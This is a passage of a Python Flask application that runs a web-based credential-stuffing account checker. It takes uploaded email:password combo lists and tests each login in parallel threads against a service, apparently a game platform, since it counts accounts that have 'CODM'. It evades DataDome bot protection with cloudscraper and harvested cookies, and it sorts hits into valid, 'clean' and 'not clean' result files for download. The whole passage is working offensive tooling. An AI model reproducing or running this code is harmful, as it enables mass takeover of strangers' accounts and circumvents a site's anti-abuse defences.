            'status': 'running',
            'start_time': time.time(),
            'client_ip': client_ip,
            'filename': filename,
            'total': 0,
            'processed': 0,
            'valid': 0,
            'invalid': 0,
            'clean': 0,
            'not_clean': 0,
            'has_codm': 0,
            'no_codm': 0,
            'stopped': False,
            'threads': threads,
            'auto_remove': auto_remove
        }
    
    # Start checking in background thread
    thread = threading.Thread(target=run_check, args=(check_id, filepath, threads, auto_remove, client_ip))
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'success': True,
        'check_id': check_id,
        'client_ip': client_ip
    })

@app.route('/api/status/<check_id>')
def get_status(check_id):
    with check_lock:
        if check_id in active_checks:
            return jsonify(active_checks[check_id])
    return jsonify({'error': 'Check not found'}), 404

@app.route('/api/stop/<check_id>', methods=['POST'])
def stop_check(check_id):
    with check_lock:
        if check_id in active_checks:
            active_checks[check_id]['stopped'] = True
            active_checks[check_id]['status'] = 'stopped'
            return jsonify({'success': True})
    return jsonify({'error': 'Check not found'}), 404

@app.route('/api/results')
def list_results():
    results = []
    if os.path.exists(app.config['RESULTS_FOLDER']):
        for check_id in os.listdir(app.config['RESULTS_FOLDER']):
            check_path = os.path.join(app.config['RESULTS_FOLDER'], check_id)
            if os.path.isdir(check_path):
                # Get check info from active_checks or from a log file
                check_info = None
                with check_lock:
                    if check_id in active_checks:
                        check_info = active_checks[check_id]
                
                files = []
                for file in os.listdir(check_path):
                    if file.endswith('.txt'):
                        filepath = os.path.join(check_path, file)
                        size = os.path.getsize(filepath)
                        modified = os.path.getmtime(filepath)
                        files.append({
                            'name': file,
                            'size': size,
                            'modified': modified,
                            'path': f"{check_id}/{file}"
                        })
                
                if files:
                    results.append({
                        'check_id': check_id,
                        'client_ip': check_info.get('client_ip', 'Unknown') if check_info else 'Unknown',
                        'timestamp': os.path.getctime(check_path),
                        'files': files,
                        'status': check_info.get('status', 'completed') if check_info else 'completed'
                    })
    
    # Sort by timestamp descending
    results.sort(key=lambda x: x['timestamp'], reverse=True)
    return jsonify(results)

@app.route('/api/download/<path:filepath>')
def download_file(filepath):
    # Security: prevent directory traversal
    if '..' in filepath or filepath.startswith('/'):
        return jsonify({'error': 'Invalid path'}), 400
    
    full_path = os.path.join(app.config['RESULTS_FOLDER'], filepath)
    if os.path.exists(full_path) and os.path.isfile(full_path):
        return send_file(full_path, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

@app.route('/api/ip')
def get_ip():
    client_ip = get_client_ip()
    return jsonify({'ip': client_ip})

# Background check function
def run_check(check_id, filepath, threads, auto_remove, client_ip):
    # Read accounts
    accounts = []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and ':' in line:
                accounts.append(line)
    
    with check_lock:
        if check_id in active_checks:
            active_checks[check_id]['total'] = len(accounts)
    
    # Initialize managers
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    
    # Create session
    session = cloudscraper.create_scraper()
    
    # Load cookies if available
    valid_cookies = cookie_manager.get_valid_cookies()
    if valid_cookies:
        combined_cookie_str = "; ".join(valid_cookies)
        applyck(session, combined_cookie_str)
        if valid_cookies:
            final_cookie = valid_cookies[-1]
            datadome_value = final_cookie.split('=', 1)[1].strip() if '=' in final_cookie else None
            if datadome_value:
                datadome_manager.set_datadome(datadome_value)
    else:
        datadome = get_datadome_cookie(session)
        if datadome:
            datadome_manager.set_datadome(datadome)
    
    result_folder = app.config['RESULTS_FOLDER']
    account_counter = 0
    
    def process_wrapper(account_line):
        nonlocal account_counter
        
        with check_lock:
            if check_id in active_checks and active_checks[check_id].get('stopped', False):
                return
        
        parts = account_line.split(':')
        if len(parts) == 2:
            account, password = parts
        elif len(parts) >= 3:
            account, password = parts[0], ':'.join(parts[1:])
        else:
            return
        
        account_counter += 1
        
        result = process_account(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder, check_id)
        
        # Update stats
        stats = live_stats.get_stats()
        with check_lock:
            if check_id in active_checks:
                active_checks[check_id].update({
                    'processed': account_counter,
                    'valid': stats['valid'],
                    'invalid': stats['invalid'],
                    'clean': stats['clean'],
                    'not_clean': stats['not_clean'],
                    'has_codm': stats['has_codm'],
                    'no_codm': stats['no_codm']
                })
    
    # Process with thread pool
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(process_wrapper, account) for account in accounts]
        for future in futures:
            with check_lock:
                if check_id in active_checks and active_checks[check_id].get('stopped', False):
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
            try:
                future.result(timeout=120)
            except Exception:
                pass
    
    # Mark as completed
    with check_lock:
        if check_id in active_checks:
            active_checks[check_id]['status'] = 'completed'
            active_checks[check_id]['end_time'] = time.time()
    
    # Save check info
    info_path = os.path.join(result_folder, check_id, 'check_info.json')
    try:
        with check_lock:
            if check_id in active_checks:
                with open(info_path, 'w') as f:
                    json.dump(active_checks[check_id], f, indent=2)
    except:
        pass
    
    logger.info(f"Check {check_id} completed for IP {client_ip}")

# Clean up old files periodically (for PythonAnywhere)
def cleanup_old_files():
    """Remove files older than 7 days to save space"""
    try:
        now = time.time()
        # Clean uploads
        for filename in os.listdir(app.config['UPLOAD_FOLDER']):
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            if os.path.isfile(filepath):
                if os.path.getmtime(filepath) < now - 7 * 86400:  # 7 days
                    os.remove(filepath)
        
        # Clean old result folders
        for check_id in os.listdir(app.config['RESULTS_FOLDER']):
            check_path = os.path.join(app.config['RESULTS_FOLDER'], check_id)
            if os.path.isdir(check_path):
                if os.path.getctime(check_path) < now - 7 * 86400:  # 7 days
                    import shutil
                    shutil.rmtree(check_path)
    except:
        pass

# Run cleanup on startup
cleanup_old_files()

# For PythonAnywhere - application entry point
application = app

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)